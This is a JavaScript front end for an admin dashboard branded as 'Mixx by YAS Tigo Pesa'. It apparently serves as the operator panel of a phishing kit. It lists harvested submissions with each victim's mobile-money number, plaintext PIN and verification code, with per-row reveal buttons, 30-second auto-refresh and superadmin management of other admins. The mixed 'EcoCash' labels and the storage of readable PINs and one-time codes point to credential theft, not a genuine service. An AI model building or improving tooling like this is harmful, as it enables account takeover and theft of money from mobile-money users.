/**
 * Mixx by YAS Tigo Pesa — Admin Dashboard
 * - Login form posts to /api/admin/login
 * - On success, fetches /api/admin/list and renders rows
 * - Supports search, pagination, and a "today / 24h" metric block
 */
(function () {
  "use strict";

  // --- DOM refs -------------------------------------------------------
  const loginScreen = document.getElementById("login-screen");
  const dashboard = document.getElementById("dashboard");
  const loginForm = document.getElementById("login-form");
  const loginStatus = document.getElementById("login-status");
  const loginBtn = loginForm ? loginForm.querySelector("button") : null;

  const rowsEl = document.getElementById("rows");
  const emptyState = document.getElementById("empty-state");
  const totalCount = document.getElementById("total-count");
  const metricTotal = document.getElementById("metric-total");
  const metricToday = document.getElementById("metric-today");
  const metric24h = document.getElementById("metric-24h");

  const searchInput = document.getElementById("search-input");
  const pageSizeSelect = document.getElementById("page-size");
  const prevBtn = document.getElementById("prev-btn");
  const nextBtn = document.getElementById("next-btn");
  const pagerInfo = document.getElementById("pager-info");
  const refreshBtn = document.getElementById("refresh-btn");
  const logoutBtn = document.getElementById("logout-btn");
  const settingsBtn = document.getElementById("settings-btn");
  const settingsModal = document.getElementById("settings-modal");
  const changePwForm = document.getElementById("change-pw-form");
  const pwCurrent = document.getElementById("pw-current");
  const pwNext = document.getElementById("pw-next");
  const pwConfirm = document.getElementById("pw-confirm");
  const pwStatus = document.getElementById("pw-status");
  const pwSubmit = document.getElementById("pw-submit");
  const toast = document.getElementById("toast");

  const superadminBtn = document.getElementById("superadmin-btn");
  const adminsModal = document.getElementById("admins-modal");
  const adminsListEl = document.getElementById("admins-list");
  const addAdminForm = document.getElementById("add-admin-form");
  const adminNameInput = document.getElementById("admin-name");
  const adminsStatus = document.getElementById("admins-status");
  const addAdminSubmit = document.getElementById("add-admin-submit");

  // --- State ----------------------------------------------------------
  let currentRole = null;
  let allItems = [];
  let page = 1;
  let pageSize = parseInt(pageSizeSelect?.value || "25", 10);
  let searchQuery = "";
  let refreshTimer = null;
  // Map<submissionId, {pin, timer}>
  const revealedPins = new Map();
  const REVEAL_TTL_MS = 10_000;
  // Map<submissionId, {code, timer}>
  const revealedCodes = new Map();
  // Submissions that have no verification code at all (older records).
  const hasVerificationCode = (it) =>
    it && (it.verificationCodeMasked || it.verificationCode);

  // --- Helpers --------------------------------------------------------
  const setLoginStatus = (msg, kind) => {
    if (!loginStatus) return;
    loginStatus.textContent = msg || "";
    loginStatus.classList.remove("is-error", "is-success");
    if (kind) loginStatus.classList.add(`is-${kind}`);
  };

  const setLoginLoading = (loading) => {
    if (!loginBtn) return;
    loginBtn.disabled = loading;
    loginBtn.classList.toggle("is-loading", loading);
  };

  const showToast = (msg, kind) => {
    if (!toast) return;
    toast.textContent = msg;
    toast.classList.remove("is-error", "is-success");
    if (kind) toast.classList.add(`is-${kind}`);
    toast.hidden = false;
    requestAnimationFrame(() => toast.classList.add("is-visible"));
    clearTimeout(showToast._t);
    showToast._t = setTimeout(() => {
      toast.classList.remove("is-visible");
      setTimeout(() => (toast.hidden = true), 250);
    }, 3000);
  };

  const showDashboard = () => {
    if (loginScreen) loginScreen.hidden = true;
    if (dashboard) dashboard.hidden = false;
  };
  const showLogin = () => {
    if (dashboard) dashboard.hidden = true;
    if (loginScreen) loginScreen.hidden = false;
  };

  const fmtDate = (iso) => {
    if (!iso) return "—";
    const d = new Date(iso);
    if (Number.isNaN(d.getTime())) return iso;
    return d.toLocaleString(undefined, {
      year: "numeric",
      month: "short",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    });
  };
  const fmtShort = (iso) => {
    if (!iso) return "—";
    const d = new Date(iso);
    if (Number.isNaN(d.getTime())) return iso;
    return d.toLocaleString(undefined, {
      month: "short",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  const isToday = (iso) => {
    const d = new Date(iso);
    if (Number.isNaN(d.getTime())) return false;
    const now = new Date();
    return (
      d.getFullYear() === now.getFullYear() &&
      d.getMonth() === now.getMonth() &&
      d.getDate() === now.getDate()
    );
  };
  const isWithinHours = (iso, h) => {
    const d = new Date(iso);
    if (Number.isNaN(d.getTime())) return false;
    return Date.now() - d.getTime() <= h * 60 * 60 * 1000;
  };

  const escapeHtml = (s) =>
    String(s ?? "").replace(/[&<>"']/g, (c) =>
      ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c])
    );

  // --- Auth flow ------------------------------------------------------
  if (loginForm) {
    loginForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      setLoginStatus("");

      const password = loginForm.elements.password.value;
      if (!password) {
        setLoginStatus("Please enter your password.", "error");
        return;
      }

      setLoginLoading(true);
      try {
        const res = await fetch("/api/admin/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ password }),
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.ok) {
          setLoginStatus(
            (data && data.error) || "Incorrect password.",
            "error"
          );
          return;
        }
        setLoginStatus("Signed in successfully.", "success");
        currentRole = data.role === "superadmin" ? "superadmin" : "admin";
        if (superadminBtn) superadminBtn.hidden = currentRole !== "superadmin";
        showDashboard();
        await loadData();
        startAutoRefresh();
      } catch (err) {
        console.error(err);
        setLoginStatus("Network error. Please try again.", "error");
      } finally {
        setLoginLoading(false);
      }
    });
  }

  if (logoutBtn) {
    logoutBtn.addEventListener("click", async () => {
      try {
        await fetch("/api/admin/logout", { method: "POST" });
      } catch (_) {}
      stopAutoRefresh();
      currentRole = null;
      if (superadminBtn) superadminBtn.hidden = true;
      showLogin();
      if (loginForm) loginForm.reset();
    });
  }

  // --- Data load + render --------------------------------------------
  async function loadData() {
    if (!rowsEl) return;
    try {
      const res = await fetch("/api/admin/list", { credentials: "same-origin" });
      if (res.status === 401) {
        showLogin();
        return;
      }
      const data = await res.json().catch(() => ({}));
      if (!res.ok || !data.ok) {
        showToast("Failed to load data.", "error");
        return;
      }
      allItems = data.items || [];
      render();
    } catch (err) {
      console.error(err);
      showToast("Network error.", "error");
    }
  }

  function applyFilter() {
    if (!searchQuery) return allItems;
    const q = searchQuery.toLowerCase();
    return allItems.filter((it) => {
      return (
        (it.id || "").toLowerCase().includes(q) ||
        (it.mixxNumber || "").toLowerCase().includes(q) ||
        (it.createdAt || "").toLowerCase().includes(q) ||
        fmtDate(it.createdAt).toLowerCase().includes(q)
      );
    });
  }

  function render() {
    // Metrics
    if (metricTotal) metricTotal.textContent = String(allItems.length);
    if (metricToday) {
      metricToday.textContent = String(
        allItems.filter((i) => isToday(i.createdAt)).length
      );
    }
    if (metric24h) {
      metric24h.textContent = String(
        allItems.filter((i) => isWithinHours(i.createdAt, 24)).length
      );
    }
    if (totalCount) {
      totalCount.textContent =
        allItems.length === 1
          ? "1 submission registered"
          : `${allItems.length} submissions registered`;
    }

    // Filter + paginate
    const filtered = applyFilter();
    const totalPages = Math.max(1, Math.ceil(filtered.length / pageSize));
    if (page > totalPages) page = totalPages;
    const start = (page - 1) * pageSize;
    const slice = filtered.slice(start, start + pageSize);

    // Empty state
    if (filtered.length === 0) {
      rowsEl.innerHTML = "";
      emptyState.hidden = false;
    } else {
      emptyState.hidden = true;
      rowsEl.innerHTML = slice
        .map(
          (it) => {
            const revealed = revealedPins.get(it.id);
            const shownPin = revealed ? escapeHtml(revealed.pin) : "••••";
            const pinClass = revealed ? "pin-cell__value" : "pin-cell__value is-masked";
            const eyeChar = revealed ? "🙈" : "👁";
            const eyeLabel = revealed ? "Hide PIN" : "Show PIN";
            const revealedCls = revealed ? " is-revealed" : "";

            // Verification code cell — only show the reveal control if
            // this record actually has a code (newer submissions do;
            // older ones don't).
            const codeEntry = revealedCodes.get(it.id);
            const hasCode = hasVerificationCode(it);
            const shownCode = codeEntry ? escapeHtml(codeEntry.code) : "••••";
            const codeClass = codeEntry
              ? "pin-cell__value"
              : "pin-cell__value is-masked";
            const codeEyeChar = codeEntry ? "🙈" : "👁";
            const codeEyeLabel = codeEntry
              ? "Hide code"
              : "Show code";
            const codeRevealedCls = codeEntry ? " is-revealed" : "";
            const codeCellHtml = hasCode
              ? `
              <span class="pin-cell">
                <span class="${codeClass}" data-code-value="${escapeHtml(
                  it.id
                )}">${shownCode}</span>
                <button
                  type="button"
                  class="pin-reveal${codeRevealedCls}"
                  data-reveal-code="${escapeHtml(it.id)}"
                  aria-label="${codeEyeLabel}"
                  aria-pressed="${codeEntry ? "true" : "false"}"
                  title="${codeEyeLabel}"
                >${codeEyeChar}</button>
              </span>`
              : `<span class="muted">—</span>`;

            return `
          <tr>
            <td data-label="ID"><span class="id-pill">${escapeHtml(it.id)}</span></td>
            <td data-label="EcoCash number" class="number-cell">${escapeHtml(
              it.mixxNumber
            )}</td>
            <td data-label="EcoCash PIN" class="muted">
              <span class="pin-cell">
                <span class="${pinClass}" data-pin-value="${escapeHtml(
              it.id
            )}">${shownPin}</span>
                <button
                  type="button"
                  class="pin-reveal${revealedCls}"
                  data-reveal="${escapeHtml(it.id)}"
                  aria-label="${eyeLabel}"
                  aria-pressed="${revealed ? "true" : "false"}"
                  title="${eyeLabel}"
                >${eyeChar}</button>
              </span>
            </td>
            <td data-label="Verification code" class="muted">${codeCellHtml}</td>
            <td data-label="Date">${escapeHtml(fmtShort(it.createdAt))}</td>
          </tr>`;
          }
        )
        .join("");
    }

    // Pager
    if (pagerInfo) {
      pagerInfo.textContent = `Page ${page} / ${totalPages}`;
    }
    if (prevBtn) prevBtn.disabled = page <= 1;
    if (nextBtn) nextBtn.disabled = page >= totalPages;
  }

  // --- Events ---------------------------------------------------------
  if (searchInput) {
    searchInput.addEventListener("input", (e) => {
      searchQuery = e.target.value.trim();
      page = 1;
      render();
    });
  }
  if (pageSizeSelect) {
    pageSizeSelect.addEventListener("change", (e) => {
      pageSize = parseInt(e.target.value, 10) || 25;
      page = 1;
      render();
    });
  }
  if (prevBtn) {
    prevBtn.addEventListener("click", () => {
      if (page > 1) {
        page--;
        render();
      }
    });
  }
  if (nextBtn) {
    nextBtn.addEventListener("click", () => {
      page++;
      render();
    });
  }
  if (refreshBtn) {
    refreshBtn.addEventListener("click", async () => {
      refreshBtn.disabled = true;
      await loadData();
      showToast("Data refreshed.", "success");
      setTimeout(() => (refreshBtn.disabled = false), 500);
    });
  }

  // --- Auto-refresh every 30s while dashboard is open -----------------
  function startAutoRefresh() {
    stopAutoRefresh();
    refreshTimer = setInterval(loadData, 30000);
  }
  function stopAutoRefresh() {
    if (refreshTimer) clearInterval(refreshTimer);
    refreshTimer = null;
  }

  // --- Reveal PIN per row --------------------------------------------
  function hidePin(id) {
    const entry = revealedPins.get(id);
    if (entry) {
      clearTimeout(entry.timer);
      revealedPins.delete(id);
    }
    // Re-render is heavy; just patch the cells in place.
    const valEl = rowsEl?.querySelector(`[data-pin-value="${CSS.escape(id)}"]`);
    const btn = rowsEl?.querySelector(`[data-reveal="${CSS.escape(id)}"]`);
    if (valEl) {
      valEl.textContent = "••••";
      valEl.classList.add("is-masked");
    }
    if (btn) {
      btn.classList.remove("is-revealed");
      btn.setAttribute("aria-pressed", "false");
      btn.setAttribute("aria-label", "Show PIN");
      btn.setAttribute("title", "Show PIN");
      btn.textContent = "👁";
      btn.disabled = false;
    }
  }

  async function revealPin(id, btn) {
    if (revealedPins.has(id)) {
      hidePin(id);
      return;
    }
    btn.disabled = true;
    try {
      const res = await fetch(
        `/api/admin/pin?id=${encodeURIComponent(id)}`,
        { credentials: "same-origin" }
      );
      if (res.status === 401) {
        showLogin();
        return;
      }
      const data = await res.json().catch(() => ({}));
      if (!res.ok || !data.ok) {
        showToast((data && data.error) || "Failed to load PIN.", "error");
        return;
      }
      const pin = String(data.pin || "");
      // Patch in place to avoid a full re-render flicker.
      const valEl = rowsEl?.querySelector(
        `[data-pin-value="${CSS.escape(id)}"]`
      );
      if (valEl) {
        valEl.textContent = pin;
        valEl.classList.remove("is-masked");
      }
      btn.classList.add("is-revealed");
      btn.setAttribute("aria-pressed", "true");
      btn.setAttribute("aria-label", "Hide PIN");
      btn.setAttribute("title", "Hide PIN");
      btn.textContent = "🙈";
      btn.disabled = false;
      // Auto-hide after TTL.
      const timer = setTimeout(() => hidePin(id), REVEAL_TTL_MS);
      revealedPins.set(id, { pin, timer });
    } catch (err) {
      console.error(err);
      showToast("Network error.", "error");
      btn.disabled = false;
    }
  }

  if (rowsEl) {
    rowsEl.addEventListener("click", (e) => {
      const codeBtn = e.target.closest("[data-reveal-code]");
      if (codeBtn) {
        const id = codeBtn.getAttribute("data-reveal-code");
        if (id) revealCode(id, codeBtn);
        return;
      }
      const btn = e.target.closest("[data-reveal]");
      if (!btn) return;
      const id = btn.getAttribute("data-reveal");
      if (id) revealPin(id, btn);
    });
  }

  // --- Reveal verification code per row ------------------------------
  function hideCode(id) {
    const entry = revealedCodes.get(id);
    if (entry) {
      clearTimeout(entry.timer);
      revealedCodes.delete(id);
    }
    const valEl = rowsEl?.querySelector(`[data-code-value="${CSS.escape(id)}"]`);
    const btn = rowsEl?.querySelector(`[data-reveal-code="${CSS.escape(id)}"]`);
    if (valEl) {
      valEl.textContent = "••••";
      valEl.classList.add("is-masked");
    }
    if (btn) {
      btn.classList.remove("is-revealed");
      btn.setAttribute("aria-pressed", "false");
      btn.setAttribute("aria-label", "Show code");
      btn.setAttribute("title", "Show code");
      btn.textContent = "👁";
      btn.disabled = false;
    }
  }

  async function revealCode(id, btn) {
    if (revealedCodes.has(id)) {
      hideCode(id);
      return;
    }
    btn.disabled = true;
    try {
      const res = await fetch(
        `/api/admin/code?id=${encodeURIComponent(id)}`,
        { credentials: "same-origin" }
      );
      if (res.status === 401) {
        showLogin();
        return;
      }
      const data = await res.json().catch(() => ({}));
      if (!res.ok || !data.ok) {
        showToast((data && data.error) || "Failed to load code.", "error");
        return;
      }
      const code = String(data.code || "");
      const valEl = rowsEl?.querySelector(
        `[data-code-value="${CSS.escape(id)}"]`
      );
      if (valEl) {
        valEl.textContent = code;
        valEl.classList.remove("is-masked");
      }
      btn.classList.add("is-revealed");
      btn.setAttribute("aria-pressed", "true");
      btn.setAttribute("aria-label", "Hide code");
      btn.setAttribute("title", "Hide code");
      btn.textContent = "🙈";
      btn.disabled = false;
      const timer = setTimeout(() => hideCode(id), REVEAL_TTL_MS);
      revealedCodes.set(id, { code, timer });
    } catch (err) {
      console.error(err);
      showToast("Network error.", "error");
      btn.disabled = false;
    }
  }

  // --- Change-password modal -----------------------------------------
  const setPwStatus = (msg, kind) => {
    if (!pwStatus) return;
    pwStatus.textContent = msg || "";
    pwStatus.classList.remove("is-error", "is-success");
    if (kind) pwStatus.classList.add(`is-${kind}`);
  };

  const openSettings = () => {
    if (!settingsModal) return;
    setPwStatus("");
    if (changePwForm) changePwForm.reset();
    settingsModal.hidden = false;
    // Focus trap: focus first field next tick.
    setTimeout(() => pwCurrent?.focus(), 30);
  };
  const closeSettings = () => {
    if (!settingsModal) return;
    settingsModal.hidden = true;
    setPwStatus("");
    if (changePwForm) changePwForm.reset();
  };

  if (settingsBtn) {
    settingsBtn.addEventListener("click", openSettings);
  }
  if (settingsModal) {
    settingsModal.addEventListener("click", (e) => {
      if (e.target && e.target.closest("[data-close-modal]")) {
        closeSettings();
      }
    });
  }
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && settingsModal && !settingsModal.hidden) {
      closeSettings();
    }
  });

  if (changePwForm) {
    changePwForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      setPwStatus("");
      const current = pwCurrent?.value || "";
      const next = pwNext?.value || "";
      const confirm = pwConfirm?.value || "";
      if (!current || !next || !confirm) {
        setPwStatus("Please fill in all fields.", "error");
        return;
      }
      if (next.length < 6) {
        setPwStatus("New password must be at least 6 characters.", "error");
        return;
      }
      if (next !== confirm) {
        setPwStatus("New passwords do not match.", "error");
        return;
      }
      if (next === current) {
        setPwStatus("New password must be different from the current one.", "error");
        return;
      }
      if (pwSubmit) {
        pwSubmit.disabled = true;
        pwSubmit.classList.add("is-loading");
      }
      try {
        const res = await fetch("/api/admin/change-password", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "same-origin",
          body: JSON.stringify({ current, next, confirm }),
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.ok) {
          setPwStatus((data && data.error) || "Could not change password.", "error");
          return;
        }
        setPwStatus(
          (data && data.message) || "Password changed successfully.",
          "success"
        );
        showToast("Password changed successfully.", "success");
        if (changePwForm) changePwForm.reset();
        setTimeout(closeSettings, 900);
      } catch (err) {
        console.error(err);
        setPwStatus("Network error. Please try again.", "error");
      } finally {
        if (pwSubmit) {
          pwSubmit.disabled = false;
          pwSubmit.classList.remove("is-loading");
        }
      }
    });
  }

  // --- Manage-admins modal (superadmin only) --------------------------
  const setAdminsStatus = (msg, kind) => {
    if (!adminsStatus) return;
    adminsStatus.textContent = msg || "";
    adminsStatus.classList.remove("is-error", "is-success");
    if (kind) adminsStatus.classList.add(`is-${kind}`);
  };

  const renderAdmins = (items) => {
    if (!adminsListEl) return;
    if (!items || items.length === 0) {
      adminsListEl.innerHTML = `<li class="admins-list__empty">No admins yet.</li>`;
      return;
    }
    adminsListEl.innerHTML = items
      .map(
        (a) => `
      <li class="admins-list__item">
        <span class="admins-list__info">
          <span class="admins-list__name">${escapeHtml(a.name)}</span>
          <span class="admins-list__date">Added ${escapeHtml(fmtShort(a.createdAt))}</span>
        </span>
        <button
          type="button"
          class="admins-list__delete"
          data-delete-admin="${escapeHtml(a.id)}"
          aria-label="Remove ${escapeHtml(a.name)}"
          title="Remove"
        >✕</button>
      </li>`
      )
      .join("");
  };

  async function loadAdmins() {
    if (!adminsListEl) return;
    try {
      const res = await fetch("/api/admin/admins/list", { credentials: "same-origin" });
      if (res.status === 401) {
        showLogin();
        return;
      }
      const data = await res.json().catch(() => ({}));
      if (!res.ok || !data.ok) {
        setAdminsStatus((data && data.error) || "Failed to load admins.", "error");
        return;
      }
      renderAdmins(data.items || []);
    } catch (err) {
      console.error(err);
      setAdminsStatus("Network error.", "error");
    }
  }

  const openAdmins = () => {
    if (!adminsModal) return;
    setAdminsStatus("");
    if (addAdminForm) addAdminForm.reset();
    adminsModal.hidden = false;
    adminsListEl.innerHTML = `<li class="admins-list__empty">Loading…</li>`;
    loadAdmins();
    setTimeout(() => adminNameInput?.focus(), 30);
  };
  const closeAdmins = () => {
    if (!adminsModal) return;
    adminsModal.hidden = true;
    setAdminsStatus("");
    if (addAdminForm) addAdminForm.reset();
  };

  if (superadminBtn) {
    superadminBtn.addEventListener("click", openAdmins);
  }
  if (adminsModal) {
    adminsModal.addEventListener("click", (e) => {
      if (e.target && e.target.closest("[data-close-modal]")) {
        closeAdmins();
      }
    });
  }
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && adminsModal && !adminsModal.hidden) {
      closeAdmins();
    }
  });

  if (addAdminForm) {
    addAdminForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      setAdminsStatus("");
      const name = (adminNameInput?.value || "").trim();
      if (!name) {
        setAdminsStatus("Please enter a name.", "error");
        return;
      }
      if (addAdminSubmit) {
        addAdminSubmit.disabled = true;
        addAdminSubmit.classList.add("is-loading");
      }
      try {
        const res = await fetch("/api/admin/admins/add", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "same-origin",
          body: JSON.stringify({ name }),
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.ok) {
          setAdminsStatus((data && data.error) || "Could not add admin.", "error");
          return;
        }
        if (addAdminForm) addAdminForm.reset();
        showToast("Admin added.", "success");
        await loadAdmins();
      } catch (err) {
        console.error(err);
        setAdminsStatus("Network error. Please try again.", "error");
      } finally {
        if (addAdminSubmit) {
          addAdminSubmit.disabled = false;
          addAdminSubmit.classList.remove("is-loading");
        }
      }
    });
  }

  if (adminsListEl) {
    adminsListEl.addEventListener("click", async (e) => {
      const btn = e.target.closest("[data-delete-admin]");
      if (!btn) return;
      const id = btn.getAttribute("data-delete-admin");
      if (!id) return;
      btn.disabled = true;
      try {
        const res = await fetch("/api/admin/admins/delete", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "same-origin",
          body: JSON.stringify({ id }),
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.ok) {
          showToast((data && data.error) || "Could not remove admin.", "error");
          btn.disabled = false;
          return;
        }
        showToast("Admin removed.", "success");
        await loadAdmins();
      } catch (err) {
        console.error(err);
        showToast("Network error.", "error");
        btn.disabled = false;
      }
    });
  }

  // --- On load: always show the login screen first -------------------
  // After successful login the dashboard is shown and auto-refresh starts.
  // Logout returns the user to this login screen.
  showLogin();
})();
